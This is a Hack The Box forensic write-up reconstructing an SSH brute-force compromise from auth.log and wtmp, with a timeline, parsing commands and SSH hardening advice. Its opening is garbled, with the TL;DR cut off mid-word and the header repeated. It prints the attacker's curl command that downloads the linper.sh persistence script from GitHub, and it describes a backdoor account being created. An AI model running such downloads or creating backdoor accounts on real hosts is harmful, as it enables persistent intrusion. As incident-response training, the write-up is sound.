# Writeup: HTB — Sherlock (SSH brute-force / Confluence)

> **Note:** All timestamps are in UTC. Logs analyzed: `auth.log`, `wtmp` (parsed), and `utmp.py` helper.

---

## TL;DR

The Confluence server was brute-forced from IP **65.2.161.68**, leading to a successful SSH authentication as user **root**. The attac# Writeup: HTB — Sherlock (SSH brute-force / Confluence)

> **Note:** All timestamps are in UTC. Logs analyzed: `auth.log`, `wtmp` (parsed) and `utmp.py` helper.

---

## TL;DR

The Confluence server was brute-forced from IP **65.2.161.68**, leading to a successful SSH authentication as user **root**. The attacker opened an interactive terminal session at **2024-03-06 06:32:45 UTC** (wtmp), which was assigned session number **37**. For persistence the attacker created a privileged backdoor account named **`cyberjunkie`** (MITRE ATT\&CK sub-technique **T1136.001** — Create Account: Local Accounts). The first SSH session terminated at **2024-03-06 06:37:24 UTC** according to `auth.log`. Using elevated privileges the attacker downloaded a script with the command:

```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## 1. Objective

Produce a clear, reproducible analysis of the `auth.log` and `wtmp` artifacts from the HTB "sherlock" challenge. Identify the brute-force source, the compromised account, the exact login/session timeline, persistence actions and evidence of post-exploitation behavior (file downloads and commands executed).

---

## 2. Key findings (summary)

* **Attacker IP (brute-force source):** `65.2.161.68`
* **Compromised username (authentication success):** `root`
* **Manual interactive login (wtmp):** `2024-03-06 06:32:45 UTC`
* **SSH session number (assigned at login):** `37`
* **Created backdoor account (persistence):** `cyberjunkie`
* **MITRE ATT\&CK sub-technique for creating account:** `T1136.001`
* **First SSH session end (auth.log):** `2024-03-06 06:37:24 UTC`
* **Sudo command to download script:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---

## 3. Investigation timeline (chronological)

1. **Brute-force activity** — multiple failed SSH authentication attempts detected from **65.2.161.68** (auth.log). These repeated failures indicate an automated password-guessing attempt against SSH.

2. **Successful authentication** — one authentication attempt from the same IP succeeded for the `root` account (auth.log). This indicates the brute-force achieved its goal and allowed the attacker to authenticate.

3. **Interactive session established** — the wtmp artifact shows a terminal/login session for the now-authenticated `root` account at **2024-03-06 06:32:45 UTC**. The session number recorded for that session is **37**. (Note: `wtmp` records are authoritative for session start/end times and TTY/session assignments.)

4. **Session activity and early end** — the session that began at 06:32:45 ended by **2024-03-06 06:37:24 UTC** as shown in `auth.log` entries. This first SSH session end timestamp may correspond to a logout or a session switch; however it provides a precise window of attacker interactivity.

5. **Persistence established** — within the session activity the attacker created a local account named `cyberjunkie`. Creating a local account for persistence maps to MITRE ATT\&CK **T1136.001**.

6. **Post-exploitation** — the attacker used elevated privileges to fetch an external script via `curl` (`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`), demonstrating attempts to deploy post-exploitation tooling or privilege-check scripts.

---

## 4. Evidence & analysis (artifact-level)

### 4.1 `auth.log`

* **Brute-force indicators:** repeated `Failed password` entries from `65.2.161.68`. Patterns consistent with scripted attempts (short intervals, many usernames attempted).
* **Successful auth line:** a `Accepted password` (or equivalent accepted method) for `root` from `65.2.161.68` marking the compromise.
* **Session termination:** `pam_unix(sshd:session): session closed for user root` line at `2024-03-06 06:37:24 UTC` documents the first session end.
* **Sudo/download command evidence:** `sudo` invocation lines and/or shell commands that show the use of `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` (depending on how verbose `auth.log` is on the system; in some setups `auth.log` captures `sudo` events and command arguments).

> Note: `auth.log` is primarily an authentication log but can contain sudo logs and session open/close messages (pam\_unix, systemd-logind entries) which are valuable for constructing a timeline.

### 4.2 `wtmp`

* **Interactive login time:** `last` or `utmp.py` parsed output shows session start `2024-03-06 06:32:45 UTC` for `root` with session ID `37`. This timestamp differs from the raw authentication event and represents when a TTY/PTY was allocated and a login session recorded.
* **Session numbering:** the session number `37` is the system-assigned wtmp/utmp slot for that login and is useful when correlating `last`, `who` or utmp parsing to in-log session markers.

### 4.3 `utmp.py` (parser)

* Use this helper to extract human-readable records from the `wtmp` binary and to map session numbers and start/end times to usernames and TTYs.

---

## 5. Reproducible commands & parsing hints

* Search for brute-force attempts in `auth.log`:

```bash
# show failed attempts grouped by IP
grep "Failed password" auth.log | awk '{print $(NF)}' | sort | uniq -c | sort -nr

# confirm accepted login lines (sanitized)
grep -E "Accepted|session opened|session closed" auth.log
```

* Extract `wtmp` records (example using last):

```bash
# human-readable wtmp parsing
last -f wtmp

# or use the provided utmp.py
python utmp.py wtmp | less
```

* Find sudo/download command evidence in logs (where sudo logs are enabled):

```bash
grep -i "sudo" auth.log
grep -i "curl" auth.log
```

---

## 6. Interpretation & impact

* **Initial access:** The server lacked sufficient protections (rate limiting, 2FA, or strong password enforcement) to block or slow the brute-force. The attacker successfully obtained root access — a complete system compromise.
* **Persistence:** Creation of a local privileged account (`cyberjunkie`) is a durable persistence mechanism, allowing the attacker ongoing access even if initial vectors are closed.
* **Post-exploitation tooling:** Downloading external scripts (e.g., `linper.sh`) suggests reconnaissance, privilege checks, or further exploitation attempts. Running arbitrary remote scripts as root increases the risk of complete system takeover and lateral movement.

---

## 7. Mitigations & recommendations

1. **Immediate response:** rotate credentials, remove the `cyberjunkie` account, inspect system for additional backdoors and restore from a known-good backup if compromise is confirmed.
2. **Harden SSH:** disable root login over SSH (`PermitRootLogin no`), enforce public-key authentication only and enable rate-limiting / fail2ban rules.
3. **Increase visibility:** enable `sudo` logging with `log_input`/`log_output` where appropriate and centralize logs to an immutable collector to prevent tampering.
4. **Access controls:** implement 2FA for remote access and restrict SSH to specific management IPs or via VPN.
5. **Hunt for persistence:** search for cron jobs, new SSH keys in `~/.ssh/authorized_keys` for unexpected users, new systemd units and suspicious SUID binaries.

---

## 8. Appendix — quick answers

1. **Attacker IP:** `65.2.161.68`
2. **Compromised username:** `root`
3. **Interactive login (wtmp):** `2024-03-06 06:32:45 UTC`
4. **SSH session number:** `37`
5. **Backdoor account name:** `cyberjunkie`
6. **MITRE sub-technique:** `T1136.001`
7. **First SSH session end (auth.log):** `2024-03-06 06:37:24 UTC`
8. **Sudo download command:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---
